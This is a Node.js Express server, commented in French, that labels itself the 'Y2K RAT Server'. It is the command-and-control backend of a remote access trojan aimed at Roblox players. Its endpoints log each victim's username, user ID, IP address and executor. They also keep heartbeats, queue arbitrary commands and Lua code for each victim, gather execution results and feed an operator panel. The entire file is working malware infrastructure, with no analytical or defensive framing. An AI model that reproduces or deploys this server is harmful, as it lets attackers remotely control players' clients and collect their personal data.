const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();
const chatHistory = new Map();
const executionResults = new Map();
const logs = new Map();

// Fonction pour ajouter un log
function addLog(userid, type, action, details = {}) {
    if (!logs.has(userid.toString())) {
        logs.set(userid.toString(), []);
    }
    
    const logEntry = {
        timestamp: Date.now(),
        type,
        action,
        details,
        date: new Date().toISOString()
    };
    
    logs.get(userid.toString()).unshift(logEntry);
    
    if (logs.get(userid.toString()).length > 500) {
        logs.get(userid.toString()).pop();
    }
    
    console.log(`📋 [LOG] ${userid}: [${type}] ${action}`);
}

// ========================================
// API ENDPOINTS - Y2K RAT
// ========================================

// Endpoint principal pour l'enregistrement des joueurs
app.post('/log', (req, res) => {
    try {
        const { 
            username, 
            userid, 
            accountAge, 
            premium, 
            game, 
            placeId, 
            jobId, 
            platform, 
            executor, 
            timestamp, 
            ip, 
            status = 'online' 
        } = req.body;

        if (!userid) {
            console.warn('⚠️ Missing userid in /log');
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        const playerData = {
            userid: userid.toString(),
            username: username || 'Unknown',
            accountAge: accountAge || '0',
            premium: premium || false,
            game: game || 'Unknown Game',
            placeId: placeId || 'N/A',
            jobId: jobId || 'N/A',
            platform: platform || 'Unknown',
            executor: executor || 'Unknown',
            ip: ip || 'Hidden',
            status: status,
            lastSeen: Date.now(),
            firstSeen: players.has(userid.toString()) 
                ? players.get(userid.toString()).firstSeen 
                : Date.now()
        };

        players.set(userid.toString(), playerData);
        
        addLog(userid, 'system', 'Client connected', {
            username,
            executor,
            game,
            ip
        });
        
        console.log(`✅ [CONNECT] ${username} (${userid}) - ${executor}`);
        res.json({ success: true, message: 'Player logged successfully' });
    } catch (error) {
        console.error('❌ Error in /log:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour le heartbeat (maintenir le statut online)
app.post('/heartbeat', (req, res) => {
    try {
        const { userid, status, timestamp } = req.body;

        if (!userid) {
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        const player = players.get(userid.toString());
        if (player) {
            player.lastSeen = Date.now();
            player.status = status || 'online';
            console.log(`💚 [HEARTBEAT] ${player.username} (${userid})`);
        }

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /heartbeat:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour récupérer les commandes (depuis le client Roblox)
app.get('/commands/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        
        const command = commands.get(userid.toString());
        
        if (command) {
            commands.delete(userid.toString());
            console.log(`📨 [COMMAND] Retrieved by ${userid}:`, command);
            return res.json([command]);
        }

        res.json([]);
    } catch (error) {
        console.error('❌ Error in /commands:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir la liste des joueurs
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        const playerList = Array.from(players.values()).map(player => ({
            ...player,
            status: (now - player.lastSeen < 20000) ? 'online' : 'offline' // 20 secondes pour être online
        }));
        
        res.json(playerList);
    } catch (error) {
        console.error('❌ Error in /players:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour envoyer des commandes depuis le panel
app.post('/command', (req, res) => {
    try {
        const { 
            userid, 
            command, 
            reason, 
            assetId, 
            speed, 
            text, 
            imageUrl, 
            size, 
            adminName, 
            chatMessage, 
            chatSender, 
            luaCode, 
            power, 
            height,
            x, y, z
        } = req.body;

        if (!userid || (!command && !chatMessage && !luaCode)) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const commandData = {};
        
        if (chatMessage) {
            commandData.chatMessage = chatMessage;
            commandData.chatSender = chatSender || 'ADMIN';
            
            if (!chatHistory.has(userid.toString())) {
                chatHistory.set(userid.toString(), []);
            }
            chatHistory.get(userid.toString()).push({
                sender: chatSender || 'ADMIN',
                message: chatMessage,
                timestamp: Date.now(),
                isAdmin: true
            });
            
            addLog(userid, 'chat', 'Admin message sent', {
                sender: chatSender || 'ADMIN',
                message: chatMessage.substring(0, 50)
            });
        } else {
            commandData.command = command;
            if (reason !== undefined) commandData.reason = reason;
            if (assetId !== undefined) commandData.assetId = assetId;
            if (speed !== undefined) commandData.speed = speed;
            if (text !== undefined) commandData.text = text;
            if (imageUrl !== undefined) commandData.imageUrl = imageUrl;
            if (size !== undefined) commandData.size = size;
            if (adminName !== undefined) commandData.adminName = adminName;
            if (luaCode !== undefined) commandData.luaCode = luaCode;
            if (power !== undefined) commandData.power = power;
            if (height !== undefined) commandData.height = height;
            if (x !== undefined) commandData.x = x;
            if (y !== undefined) commandData.y = y;
            if (z !== undefined) commandData.z = z;
            
            const details = { command };
            if (luaCode) details.code = luaCode.substring(0, 50);
            
            addLog(userid, 'command', `Command: ${command || 'exec'}`, details);
        }

        commands.set(userid.toString(), commandData);
        console.log(`📤 [COMMAND] Queued for ${userid}:`, commandData);

        res.json({ 
            success: true, 
            message: chatMessage ? 'Chat sent' : `Command queued` 
        });
    } catch (error) {
        console.error('❌ Error in /command:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour obtenir les logs
app.get('/logs/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const userLogs = logs.get(userid.toString()) || [];
        res.json(userLogs);
    } catch (error) {
        console.error('❌ Error in /logs:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir l'historique du chat
app.get('/chat/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const history = chatHistory.get(userid.toString()) || [];
        res.json(history);
    } catch (error) {
        console.error('❌ Error in /chat:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir les résultats d'exécution
app.get('/exec-result/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const result = executionResults.get(userid.toString());
        if (result) {
            executionResults.delete(userid.toString());
            res.json(result);
        } else {
            res.json({ hasResult: false });
        }
    } catch (error) {
        console.error('❌ Error in /exec-result:', error);
        res.status(500).json({ hasResult: false, error: error.message });
    }
});

// Endpoint pour soumettre un résultat d'exécution
app.post('/exec-result', (req, res) => {
    try {
        const { userid, success, result, error } = req.body;
        
        if (!userid) {
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        executionResults.set(userid.toString(), {
            success,
            result: result || '',
            error: error || '',
            timestamp: Date.now()
        });

        addLog(userid, 'exec', success ? 'Code executed' : 'Execution failed', {
            success,
            result: result ? result.substring(0, 100) : '',
            error: error || ''
        });

        console.log(`📊 [EXEC] Result from ${userid}:`, { success });
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /exec-result POST:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        players.delete(userid.toString());
        commands.delete(userid.toString());
        chatHistory.delete(userid.toString());
        executionResults.delete(userid.toString());
        logs.delete(userid.toString());
        console.log(`🗑️ [DELETE] Player ${userid} removed`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /player DELETE:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online',
        name: 'Y2K RAT Server',
        version: '1.0.0',
        players: players.size,
        commands: commands.size,
        uptime: process.uptime()
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Nettoyage automatique des joueurs inactifs (30 secondes)
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    
    for (const [userid, player] of players.entries()) {
        if (now - player.lastSeen > 30000) {
            console.log(`🔴 [TIMEOUT] ${player.username} (${userid})`);
            addLog(userid, 'system', 'Client disconnected (timeout)', {
                username: player.username,
                lastSeen: new Date(player.lastSeen).toISOString()
            });
            players.delete(userid);
            commands.delete(userid);
            chatHistory.delete(userid);
            executionResults.delete(userid);
            cleaned++;
        }
    }
    
    if (cleaned > 0) {
        console.log(`🧹 [CLEANUP] Removed ${cleaned} inactive client(s)`);
    }
}, 15000); // Vérifie toutes les 15 secondes

// Nettoyage des résultats d'exécution périmés
setInterval(() => {
    const now = Date.now();
    for (const [userid, result] of executionResults.entries()) {
        if (now - result.timestamp > 300000) {
            executionResults.delete(userid);
        }
    }
}, 60000);

// Gestion des erreurs globales
app.use((err, req, res, next) => {
    console.error('❌ [ERROR]', err);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error',
        message: err.message 
    });
});

// Démarrage du serveur
app.listen(PORT, '0.0.0.0', () => {
    console.log('╔════════════════════════════════════════╗');
    console.log('║         Y2K RAT SERVER v1.0           ║');
    console.log('╚════════════════════════════════════════╝');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Local: http://localhost:${PORT}`);
    console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
    console.log(`✅ Ready to accept connections`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
});
